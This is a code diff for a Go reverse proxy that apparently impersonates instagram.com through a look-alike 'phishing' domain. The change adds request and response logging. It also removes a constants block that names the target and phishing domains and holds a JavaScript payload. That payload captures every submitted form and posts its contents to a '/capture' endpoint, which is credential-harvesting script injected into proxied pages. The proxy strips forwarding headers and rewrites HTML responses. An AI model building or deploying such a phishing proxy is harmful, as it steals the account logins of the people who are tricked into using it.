@@ -15,18 +15,6 @@ import (
 	"github.com/andybalholm/brotli"
 )
 
-const (
-	targetDomain   = "instagram.com"
-	phishingDomain = "ex-ample.com" // still confused abt this bit
-	jsPayload      = `// Add malicious JS here
-document.addEventListener('submit', function(e) {
-	fetch('/capture', {
-		method: 'POST',
-		body: JSON.stringify(Array.from(new FormData(e.target)) 
-	});
-});`
-)
-
 func createProxy() *httputil.ReverseProxy {
 	target, _ := url.Parse("https://" + targetDomain)
 	proxy := httputil.NewSingleHostReverseProxy(target)
@@ -37,6 +25,12 @@ func createProxy() *httputil.ReverseProxy {
 
 	// Modify request from proxy to target
 	proxy.Director = func(req *http.Request) {
+
+		if verbosity == VerbosityOriginal || verbosity == VerbosityAll {
+			log.Printf("PROXY -> TARGET [ORIGINAL] |\nMethod: %s\nURL:%s\nHeaders:\n%v",
+				req.Method, req.URL.String(), formatHeaders(req.Header))
+		}
+
 		req.URL.Scheme = target.Scheme
 		req.URL.Host = target.Host
 		req.Host = target.Host // Critic for SNI in TLS handshake
@@ -46,6 +40,11 @@ func createProxy() *httputil.ReverseProxy {
 		req.Header.Del("X-Forwarded-For") // Sets the original IP that made request to proxy
 		req.Header.Del("Forwarded")
 		req.Header.Del("Via")
+
+		if verbosity == VerbosityModified || verbosity == VerbosityAll {
+			log.Printf("PROXY -> TARGET [MODIFIED] |\nMethod: %s\nURL:%s\nHeaders:\n%v",
+				req.Method, req.URL.String(), formatHeaders(req.Header))
+		}
 	}
 
 	// Modify response from proxy to client
@@ -55,6 +54,12 @@ func createProxy() *httputil.ReverseProxy {
 }
 
 func modifyResponse(resp *http.Response) error {
+
+	if verbosity == VerbosityOriginal || verbosity == VerbosityAll {
+		log.Printf("CLIENT <- PROXY response [ORIGINAL] |\nStatus Code: %d\nStatus:%s\nHeaders:\n%v",
+			resp.StatusCode, resp.Status, formatHeaders(resp.Header))
+	}
+
 	if !strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
 		return nil
 	}
@@ -80,13 +85,17 @@ func modifyResponse(resp *http.Response) error {
 	if encoding != "" {
 		resp.Header.Set("Content-Encoding", encoding)
 	}
+
+	if verbosity == VerbosityModified || verbosity == VerbosityAll {
+		log.Printf("CLIENT <- PROXY response [MODIFIED] |\nStatus Code: %d\nStatus:%s\nHeaders:\n%v",
+			resp.StatusCode, resp.Status, formatHeaders(resp.Header))
+	}
+
 	return nil
 }
 
 func decompressBody(body io.ReadCloser, encoding string) ([]byte, error) {
 	defer body.Close()
-
-	log.Printf("[DECOMPRESS] Encoding: '%s'", encoding)
 
 	switch encoding {
 	case "br":
